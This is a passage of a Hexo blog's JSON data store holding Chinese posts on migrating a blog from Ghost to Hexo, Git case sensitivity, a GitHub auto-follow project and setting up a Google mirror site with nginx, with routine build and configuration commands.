title=\"前提\"></a>前提</h1><p>在搬家之前，首先你要有一个Github，或者Gitlab，本文不过多叙述：</p>\n<ul>\n<li>安装HEXO</li>\n<li>配置Github</li>\n</ul>\n<h1 id=\"搬家\"><a href=\"#搬家\" class=\"headerlink\" title=\"搬家\"></a>搬家</h1><h2 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h2><p>Ghost导出数据json：实验室-导出，下载好json</p>\n<h2 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h2><p>安装搬家工具<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm i hexo-migrator-ghost --save</div></pre></td></tr></table></figure></p>\n<h2 id=\"第三步\"><a href=\"#第三步\" class=\"headerlink\" title=\"第三步\"></a>第三步</h2><p>修改<code>./scaffolds/post.md</code>文件内容为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">title: &#123;&#123; title &#125;&#125;  </div><div class=\"line\">date: &#123;&#123; date &#125;&#125;  </div><div class=\"line\">tags: &#123;&#123; tags &#125;&#125;  </div><div class=\"line\">---</div></pre></td></tr></table></figure>\n<h2 id=\"第四步\"><a href=\"#第四步\" class=\"headerlink\" title=\"第四步\"></a>第四步</h2><p>将json文件放到根目录，并且执行：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">hexo migrate ghost source.json  </div><div class=\"line\">hexo clean ; hexo d -g</div></pre></td></tr></table></figure>\n<h1 id=\"注意\"><a href=\"#注意\" class=\"headerlink\" title=\"注意\"></a>注意</h1><p>经过以上步骤，基本上是搬家完毕了，但是仍有一些需要注意的：</p>\n<ul>\n<li>HEXO的Markdown语法比较严谨，所以倒入进来会存在问题，需要进一步修正，比如#如果前面不空格是不解析标题的</li>\n<li>tag可能会出问题，会自动加–，请自行删除，或者批量删除</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>想了很长时间，权衡了一下利弊，还是觉得Github Pages平台会好一些，虽然可能我用了几天就会被和谐掉。</p>\n<p>但是GHOST还需要找专门能够运行Node的平台，在这方面，全静态的HEXO绝对是博客的首选。</p>\n<h1 id=\"前提\"><a href=\"#前提\" class=\"headerlink\" title=\"前提\"></a>前提</h1><p>在搬家之前，首先你要有一个Github，或者Gitlab，本文不过多叙述：</p>\n<ul>\n<li>安装HEXO</li>\n<li>配置Github</li>\n</ul>\n<h1 id=\"搬家\"><a href=\"#搬家\" class=\"headerlink\" title=\"搬家\"></a>搬家</h1><h2 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h2><p>Ghost导出数据json：实验室-导出，下载好json</p>\n<h2 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h2><p>安装搬家工具<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm i hexo-migrator-ghost --save</div></pre></td></tr></table></figure></p>\n<h2 id=\"第三步\"><a href=\"#第三步\" class=\"headerlink\" title=\"第三步\"></a>第三步</h2><p>修改<code>./scaffolds/post.md</code>文件内容为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">title: &#123;&#123; title &#125;&#125;  </div><div class=\"line\">date: &#123;&#123; date &#125;&#125;  </div><div class=\"line\">tags: &#123;&#123; tags &#125;&#125;  </div><div class=\"line\">---</div></pre></td></tr></table></figure>\n<h2 id=\"第四步\"><a href=\"#第四步\" class=\"headerlink\" title=\"第四步\"></a>第四步</h2><p>将json文件放到根目录，并且执行：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">hexo migrate ghost source.json  </div><div class=\"line\">hexo clean ; hexo d -g</div></pre></td></tr></table></figure>\n<h1 id=\"注意\"><a href=\"#注意\" class=\"headerlink\" title=\"注意\"></a>注意</h1><p>经过以上步骤，基本上是搬家完毕了，但是仍有一些需要注意的：</p>\n<ul>\n<li>HEXO的Markdown语法比较严谨，所以倒入进来会存在问题，需要进一步修正，比如#如果前面不空格是不解析标题的</li>\n<li>tag可能会出问题，会自动加–，请自行删除，或者批量删除</li>\n</ul>\n"},{"title":"Git 文件、文件夹区分大小写","date":"2017-01-07T02:25:32.000Z","header-img":"/content/images/githubauto/background.jpg","_content":"\n其实非常简单，只是提醒一个小常识，Git默认是不区分文件，文件夹大小写的。\n\n这会给很多人带来很多困扰，比如文件改了名，在严格区分大小写的系统下，实际上是两个不同名字的文件，但是Git不区分大小写机制导致无法正常的commit。\n\n开启Git区分大小写\n\n```\ngit config core.ignorecase false\n```\n\n最近爱上了给别人找bug，Pull Request，❤️Github。\n\n任何细节，都很重要。\n\n","source":"_posts/Git-文件区分大小写.md","raw":"---\ntitle: Git 文件、文件夹区分大小写\ndate: 2017-01-07 02:25:32\npermalink: gitcase\ntags: Github\ncategories: Github\nheader-img: \"/content/images/githubauto/background.jpg\"\n---\n\n其实非常简单，只是提醒一个小常识，Git默认是不区分文件，文件夹大小写的。\n\n这会给很多人带来很多困扰，比如文件改了名，在严格区分大小写的系统下，实际上是两个不同名字的文件，但是Git不区分大小写机制导致无法正常的commit。\n\n开启Git区分大小写\n\n```\ngit config core.ignorecase false\n```\n\n最近爱上了给别人找bug，Pull Request，❤️Github。\n\n任何细节，都很重要。\n\n","slug":"gitcase","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xnx000l5es5xmwccl8i","content":"<p>其实非常简单，只是提醒一个小常识，Git默认是不区分文件，文件夹大小写的。</p>\n<p>这会给很多人带来很多困扰，比如文件改了名，在严格区分大小写的系统下，实际上是两个不同名字的文件，但是Git不区分大小写机制导致无法正常的commit。</p>\n<p>开启Git区分大小写</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">git config core.ignorecase false</div></pre></td></tr></table></figure>\n<p>最近爱上了给别人找bug，Pull Request，❤️Github。</p>\n<p>任何细节，都很重要。</p>\n","excerpt":"","more":"<p>其实非常简单，只是提醒一个小常识，Git默认是不区分文件，文件夹大小写的。</p>\n<p>这会给很多人带来很多困扰，比如文件改了名，在严格区分大小写的系统下，实际上是两个不同名字的文件，但是Git不区分大小写机制导致无法正常的commit。</p>\n<p>开启Git区分大小写</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">git config core.ignorecase false</div></pre></td></tr></table></figure>\n<p>最近爱上了给别人找bug，Pull Request，❤️Github。</p>\n<p>任何细节，都很重要。</p>\n"},{"title":"Github Follow 及 BaiduBlogTransfer 项目","date":"2016-11-08T01:24:35.000Z","_content":"最近总是有莫名其妙的人关注我的Github，于是乎突发奇想，做了一个Github批量跟随的Python小程序。\n\n用Python做这种事情最过瘾，Python短小、精炼、库多，非常好用，用了不到2个小时就把整个小程序完成了。\n<!-- more --> \n项目地址：\n\n[点击进入项目](https://github.com/yfgeek/AutoGithub)\n\n\n除此之外，我还整理了只去百度空间的Blogs放到了Github封存。\n\nhttps://github.com/yfgeek/Blog\n\n目录是用一个python小程序自动生成的，通过修改@cheezer的BaiduBlogTransfer项目的代码，添加了生成Markdown功能，把原来百度空间的内容全部导出来了。\n\n[点击进入项目](https://github.com/yfgeek/BaiduBlogTransferer)\n\n百度空间是我最早的Blog(2007-2011)，小学初中，后转战独立空间VPS，先后用过Worldpress,Ghost以及现在的Hexo。\n\n百度空间有着很多的回忆，和百度斗智斗勇玩import js的eDIKID.CSS是美好的回忆❤️。\n\n百度空间被百度关闭了，文章也没有了。\n\n百度空间为我在初中高中时的玩具，部分内容掺杂当时网络用语，而且现在看来相当多的文章打脸，请不要用现在的眼光和视野去看过去的文章，在那个时候没有现在的思想和技术，所以文章内容过于幼稚。\n\n❤️:3Mac\n                                   \n","source":"_posts/Github Follow 及 BaiduBlogTransfer 项目.md","raw":"---\ntitle: 'Github Follow 及 BaiduBlogTransfer 项目'\ndate: 2016-11-08 01:24:35\ntags: github\ncategories: github\n---\n最近总是有莫名其妙的人关注我的Github，于是乎突发奇想，做了一个Github批量跟随的Python小程序。\n\n用Python做这种事情最过瘾，Python短小、精炼、库多，非常好用，用了不到2个小时就把整个小程序完成了。\n<!-- more --> \n项目地址：\n\n[点击进入项目](https://github.com/yfgeek/AutoGithub)\n\n\n除此之外，我还整理了只去百度空间的Blogs放到了Github封存。\n\nhttps://github.com/yfgeek/Blog\n\n目录是用一个python小程序自动生成的，通过修改@cheezer的BaiduBlogTransfer项目的代码，添加了生成Markdown功能，把原来百度空间的内容全部导出来了。\n\n[点击进入项目](https://github.com/yfgeek/BaiduBlogTransferer)\n\n百度空间是我最早的Blog(2007-2011)，小学初中，后转战独立空间VPS，先后用过Worldpress,Ghost以及现在的Hexo。\n\n百度空间有着很多的回忆，和百度斗智斗勇玩import js的eDIKID.CSS是美好的回忆❤️。\n\n百度空间被百度关闭了，文章也没有了。\n\n百度空间为我在初中高中时的玩具，部分内容掺杂当时网络用语，而且现在看来相当多的文章打脸，请不要用现在的眼光和视野去看过去的文章，在那个时候没有现在的思想和技术，所以文章内容过于幼稚。\n\n❤️:3Mac\n                                   \n","slug":"Github Follow 及 BaiduBlogTransfer 项目","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xnx000n5es5rpilsf0p","content":"<p>最近总是有莫名其妙的人关注我的Github，于是乎突发奇想，做了一个Github批量跟随的Python小程序。</p>\n<p>用Python做这种事情最过瘾，Python短小、精炼、库多，非常好用，用了不到2个小时就把整个小程序完成了。<br><a id=\"more\"></a><br>项目地址：</p>\n<p><a href=\"https://github.com/yfgeek/AutoGithub\" target=\"_blank\" rel=\"external\">点击进入项目</a></p>\n<p>除此之外，我还整理了只去百度空间的Blogs放到了Github封存。</p>\n<p><a href=\"https://github.com/yfgeek/Blog\" target=\"_blank\" rel=\"external\">https://github.com/yfgeek/Blog</a></p>\n<p>目录是用一个python小程序自动生成的，通过修改@cheezer的BaiduBlogTransfer项目的代码，添加了生成Markdown功能，把原来百度空间的内容全部导出来了。</p>\n<p><a href=\"https://github.com/yfgeek/BaiduBlogTransferer\" target=\"_blank\" rel=\"external\">点击进入项目</a></p>\n<p>百度空间是我最早的Blog(2007-2011)，小学初中，后转战独立空间VPS，先后用过Worldpress,Ghost以及现在的Hexo。</p>\n<p>百度空间有着很多的回忆，和百度斗智斗勇玩import js的eDIKID.CSS是美好的回忆❤️。</p>\n<p>百度空间被百度关闭了，文章也没有了。</p>\n<p>百度空间为我在初中高中时的玩具，部分内容掺杂当时网络用语，而且现在看来相当多的文章打脸，请不要用现在的眼光和视野去看过去的文章，在那个时候没有现在的思想和技术，所以文章内容过于幼稚。</p>\n<p>❤️:3Mac</p>\n","excerpt":"<p>最近总是有莫名其妙的人关注我的Github，于是乎突发奇想，做了一个Github批量跟随的Python小程序。</p>\n<p>用Python做这种事情最过瘾，Python短小、精炼、库多，非常好用，用了不到2个小时就把整个小程序完成了。<br>","more":"<br>项目地址：</p>\n<p><a href=\"https://github.com/yfgeek/AutoGithub\">点击进入项目</a></p>\n<p>除此之外，我还整理了只去百度空间的Blogs放到了Github封存。</p>\n<p><a href=\"https://github.com/yfgeek/Blog\">https://github.com/yfgeek/Blog</a></p>\n<p>目录是用一个python小程序自动生成的，通过修改@cheezer的BaiduBlogTransfer项目的代码，添加了生成Markdown功能，把原来百度空间的内容全部导出来了。</p>\n<p><a href=\"https://github.com/yfgeek/BaiduBlogTransferer\">点击进入项目</a></p>\n<p>百度空间是我最早的Blog(2007-2011)，小学初中，后转战独立空间VPS，先后用过Worldpress,Ghost以及现在的Hexo。</p>\n<p>百度空间有着很多的回忆，和百度斗智斗勇玩import js的eDIKID.CSS是美好的回忆❤️。</p>\n<p>百度空间被百度关闭了，文章也没有了。</p>\n<p>百度空间为我在初中高中时的玩具，部分内容掺杂当时网络用语，而且现在看来相当多的文章打脸，请不要用现在的眼光和视野去看过去的文章，在那个时候没有现在的思想和技术，所以文章内容过于幼稚。</p>\n<p>❤️:3Mac</p>"},{"title":"Google镜像站的搭建","date":"2016-12-11T19:21:59.000Z","_content":"\n前两天，Google开发者大会高调的宣布Google Developers 网站终于正式上线了，希望Google能够解决一切问题，早日回归大陆市场。\n\n<!-- more -->\n\n# 教程\n## 环境\n\nCentos 6 \n\n## 依赖\n1. nginx\n2. pcre 正则\n3. ngx_http_proxy_module 反向代理\n4. ngx_http_substitutions_filter_module 多重替换\n\n## 安装\n```bash\n#\n# 安装 gcc & git\n#\napt-get install build-essential git gcc g++ make\n\n#\n# 下载最新版源码\n# nginx 官网: \n# http://nginx.org/en/download.html\n#\nwget \"http://nginx.org/download/nginx-1.7.8.tar.gz\"\n\n#\n# 下载最新版 pcre\n# pcre 官网:\n# http://www.pcre.org/\n#\nwget \"ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.38.tar.gz\"\n\n#\n# 下载最新版 openssl\n# opessl 官网:\n# https://www.openssl.org/\n#\nwget \"https://www.openssl.org/source/openssl-1.0.1j.tar.gz\"\n\n#\n# 下载最新版 zlib\n# zlib 官网:\n# http://www.zlib.net/\n#\nwget \"http://zlib.net/zlib-1.2.8.tar.gz\"\n\n#\n# 下载本扩展\n#\ngit clone https://github.com/cuber/ngx_http_google_filter_module\n\n#\n# 下载 substitutions 扩展\n#\ngit clone https://github.com/yaoweibin/ngx_http_substitutions_filter_module\n\n\n#\n# 解压缩\n#\ntar xzvf nginx-1.7.8.tar.gz\ntar xzvf pcre-8.38.tar.gz\ntar xzvf openssl-1.0.1j.tar.gz\ntar xzvf zlib-1.2.8.tar.gz\n\n#\n# 进入 nginx 源码目录\n#\ncd nginx-1.7.8\n\n#\n# 设置编译选项\n#\n./configure \\\n  --prefix=/opt/nginx-1.7.8 \\\n  --with-pcre=../pcre-8.38 \\\n  --with-openssl=../openssl-1.0.1j \\\n  --with-zlib=../zlib-1.2.8 \\\n  --with-http_ssl_module \\\n  --add-module=../ngx_http_google_filter_module \\\n  --add-module=../ngx_http_substitutions_filter_module\n\n#\n# 编译, 安装\n# 如果扩展有报错, 请发 issue 到\n# https://github.com/cuber/ngx_http_google_filter_module/issues\n#\nmake\nsudo make install\n\n#\n# 启动, 安装过程到此结束\n#\nsudo /opt/nginx-1.7.8/sbin/nginx\n\nvi /opt/nginx-1.7.8/conf/nginx.conf\n\n```\nhttp配置方式\n```javascript\nserver {\n  server_name <你的域名>;\n  listen 80;\n\n  resolver 8.8.8.8;\n  location / {\n    google on;\n  }\n}\n```\nhttps配置方式\n```javascript\nserver {\n  server_name <你的域名>;\n  listen 443;\n\n  ssl on;\n  ssl_certificate <你的证书>;\n  ssl_certificate_key <你的私钥>;\n\n  resolver 8.8.8.8;\n  location / {\n    google on;\n  }\n}\n```\n随后\n```bash\n#\n# 配置修改后, 需要 reload nginx 来让配置生效, \n#\nsudo /opt/nginx-1.7.8/sbin/nginx -s reload\n```\n\n# 结果\n\n测试一下网站，是可以访问的，出于一些原因，我个人搭建的镜像站不予公开。\n\n# 参考技术\n\nhttps://github.com/cuber/ngx_http_google_filter_module","source":"_posts/Google镜像站的搭建.md","raw":"---\ntitle: Google镜像站的搭建\ndate: 2016-12-11 19:21:59\ntags: Ops\ncategories: Ops\n---\n\n前两天，Google开发者大会高调的宣布Google Developers 网站终于正式上线了，希望Google能够解决一切问题，早日回归大陆市场。\n\n<!-- more -->\n\n# 教程\n## 环境\n\nCentos 6 \n\n## 依赖\n1. nginx\n2. pcre 正则\n3. ngx_http_proxy_module 反向代理\n4. ngx_http_substitutions_filter_module 多重替换\n\n## 安装\n```bash\n#\n# 安装 gcc & git\n#\napt-get install build-essential git gcc g++ make\n\n#\n# 下载最新版源码\n# nginx 官网: \n# http://nginx.org/en/download.html\n#\nwget \"http://nginx.org/download/nginx-1.7.8.tar.gz\"\n\n#\n# 下载最新版 pcre\n# pcre 官网:\n# http://www.pcre.org/\n#\nwget \"ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.38.tar.gz\"\n\n#\n# 下载最新版 openssl\n# opessl 官网:\n# https://www.openssl.org/\n#\nwget \"https://www.openssl.org/source/openssl-1.0.1j.tar.gz\"\n\n#\n# 下载最新版 zlib\n# zlib 官网:\n# http://www.zlib.net/\n#\nwget \"http://zlib.net/zlib-1.2.8.tar.gz\"\n\n#\n# 下载本扩展\n#\ngit clone https://github.com/cuber/ngx_http_google_filter_module\n\n#\n# 下载 substitutions 扩展\n#\ngit clone https://github.com/yaoweibin/ngx_http_substitutions_filter_module\n\n\n#\n# 解压缩\n#\ntar xzvf nginx-1.7.8.tar.gz\ntar xzvf pcre-8.38.tar.gz\ntar xzvf openssl-1.0.1j.tar.gz\ntar xzvf zlib-1.2.8.tar.gz\n\n#\n# 进入 nginx 源码目录\n#\ncd nginx-1.7.8\n\n#\n# 设置编译选项\n#\n./configure \\\n  --prefix=/opt/nginx-1.7.8 \\\n  --with-pcre=../pcre-8.38 \\\n  --with-openssl=../openssl-1.0.1j \\\n  --with-zlib=../zlib-1.2.8 \\\n  --with-http_ssl_module \\\n  --add-module=../ngx_http_google_filter_module \\\n  --add-module=../ngx_http_substitutions_filter_module\n\n#\n# 编译, 安装\n# 如果扩展有报错, 请发 issue 到\n# https://github.com/cuber/ngx_http_google_filter_module/issues\n#\nmake\nsudo make install\n\n#\n# 启动, 安装过程到此结束\n#\nsudo /opt/nginx-1.7.8/sbin/nginx\n\nvi /opt/nginx-1.7.8/conf/nginx.conf\n\n```\nhttp配置方式\n```javascript\nserver {\n  server_name <你的域名>;\n  listen 80;\n\n  resolver 8.8.8.8;\n  location / {\n    google on;\n  }\n}\n```\nhttps配置方式\n```javascript\nserver {\n  server_name <你的域名>;\n  listen 443;\n\n  ssl on;\n  ssl_certificate <你的证书>;\n  ssl_certificate_key <你的私钥>;\n\n  resolver 8.8.8.8;\n  location / {\n    google on;\n  }\n}\n```\n随后\n```bash\n#\n# 配置修改后, 需要 reload nginx 来让配置生效, \n#\nsudo /opt/nginx-1.7.8/sbin/nginx -s reload\n```\n\n# 结果\n\n测试一下网站，是可以访问的，出于一些原因，我个人搭建的镜像站不予公开。\n\n# 参考技术\n\nhttps://github.com/cuber/ngx_http_google_filter_module","slug":"Google镜像站的搭建","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xo1000r5es5st1rcfzt","content":"<p>前两天，Google开发者大会高调的宣布Google Developers 网站终于正式上线了，希望Google能够解决一切问题，早日回归大陆市场。</p>\n<a id=\"more\"></a>\n<h1 id=\"教程\"><a href=\"#教程\" class=\"headerlink\" title=\"教程\"></a>教程</h1><h2 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h2><p>Centos 6 </p>\n<h2 id=\"依赖\"><a href=\"#依赖\" class=\"headerlink\" title=\"依赖\"></a>依赖</h2><ol>\n<li>nginx</li>\n<li>pcre 正则</li>\n<li>ngx_http_proxy_module 反向代理</li>\n<li>ngx_http_substitutions_filter_module 多重替换</li>\n</ol>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 安装 gcc &amp; git</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">apt-get install build-essential git gcc g++ make</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 下载最新版源码</span></div><div class=\"line\"><span class=\"comment\"># nginx 官网: </span></div><div class=\"line\"><span class=\"comment\"># http://nginx.org/en/download.html</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">wget <span class=\"string\">\"http://nginx.org/download/nginx-1.7.8.tar.gz\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 下载最新版 pcre</span></div><div class=\"line\"><span class=\"comment\"># pcre 官网:</span></div><div class=\"line\"><span class=\"comment\"># http://www.pcre.org/</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">wget <span class=\"string\">\"ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.38.tar.gz\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 下载最新版 openssl</span></div><div class=\"line\"><span class=\"comment\"># opessl 官网:</span></div><div class=\"line\"><span class=\"comment\"># https://www.openssl.org/</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">wget <span class=\"string\">\"https://www.openssl.org/source/openssl-1.0.1j.tar.gz\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 下载最新版 zlib</span></div><div class=\"line\"><span class=\"comment\"># zlib 官网:</span></div><div class=\"line\"><span class=\"comment\"># http://www.zlib.net/</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">wget <span class=\"string\">\"http://zlib.net/zlib-1.2.8.tar.gz\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 下载本扩展</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/cuber/ngx_http_google_filter_module</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 下载 substitutions 扩展</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/yaoweibin/ngx_http_substitutions_filter_module</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 解压缩</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">tar xzvf nginx-1.7.8.tar.gz</div><div class=\"line\">tar xzvf pcre-8.38.tar.gz</div><div class=\"line\">tar xzvf openssl-1.0.1j.tar.gz</div><div class=\"line\">tar xzvf zlib-1.2.8.tar.gz</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 进入 nginx 源码目录</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"built_in\">cd</span> nginx-1.7.8</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 设置编译选项</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">./configure \\</div><div class=\"line\">  --prefix=/opt/nginx-1.7.8 \\</div><div class=\"line\">  --with-pcre=../pcre-8.38 \\</div><div class=\"line\">  --with-openssl=../openssl-1.0.1j \\</div><div class=\"line\">  --with-zlib=../zlib-1.2.8 \\</div><div class=\"line\">  --with-http_ssl_module \\</div><div class=\"line\">  --add-module=../ngx_http_google_filter_module \\</div><div class=\"line\">  --add-module=../ngx_http_substitutions_filter_module</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 编译, 安装</span></div><div class=\"line\"><span class=\"comment\"># 如果扩展有报错, 请发 issue 到</span></div><div class=\"line\"><span class=\"comment\"># https://github.com/cuber/ngx_http_google_filter_module/issues</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">make</div><div class=\"line\">sudo make install</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 启动, 安装过程到此结束</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">sudo /opt/nginx-1.7.8/sbin/nginx</div><div class=\"line\"></div><div class=\"line\">vi /opt/nginx-1.7.8/conf/nginx.conf</div></pre></td></tr></table></figure>\n<p>http配置方式<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">server &#123;</div><div class=\"line\">  server_name &lt;你的域名&gt;;</div><div class=\"line\">  listen <span class=\"number\">80</span>;</div><div class=\"line\"></div><div class=\"line\">  resolver <span class=\"number\">8.8</span><span class=\"number\">.8</span><span class=\"number\">.8</span>;</div><div class=\"line\">  location / &#123;</div><div class=\"line\">    google on;</div><div class=\"line\">  &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>https配置方式<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">server &#123;</div><div class=\"line\">  server_name &lt;你的域名&gt;;</div><div class=\"line\">  listen <span class=\"number\">443</span>;</div><div class=\"line\"></div><div class=\"line\">  ssl on;</div><div class=\"line\">  ssl_certificate &lt;你的证书&gt;;</div><div class=\"line\">  ssl_certificate_key &lt;你的私钥&gt;;</div><div class=\"line\"></div><div class=\"line\">  resolver <span class=\"number\">8.8</span><span class=\"number\">.8</span><span class=\"number\">.8</span>;</div><div class=\"line\">  location / &#123;</div><div class=\"line\">    google on;</div><div class=\"line\">  &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>随后<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 配置修改后, 需要 reload nginx 来让配置生效, </span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">sudo /opt/nginx-1.7.8/sbin/nginx <span class=\"_\">-s</span> reload</div></pre></td></tr></table></figure></p>\n<h1 id=\"结果\"><a href=\"#结果\" class=\"headerlink\" title=\"结果\"></a>结果</h1><p>测试一下网站，是可以访问的，出于一些原因，我个人搭建的镜像站不予公开。</p>\n<h1 id=\"参考技术\"><a href=\"#参考技术\" class=\"headerlink\" title=\"参考技术\"></a>参考技术</h1><p><a href=\"https://github.com/cuber/ngx_http_google_filter_module\" target=\"_blank\" rel=\"external\">https://github.com/cuber/ngx_http_google_filter_module</a></p>\n","excerpt":"<p>前两天，Google开发者大会高调的宣布Google Developers 网站终于正式上线了，希望Google能够解决一切问题，早日回归大陆市场。</p>","more":"<h1 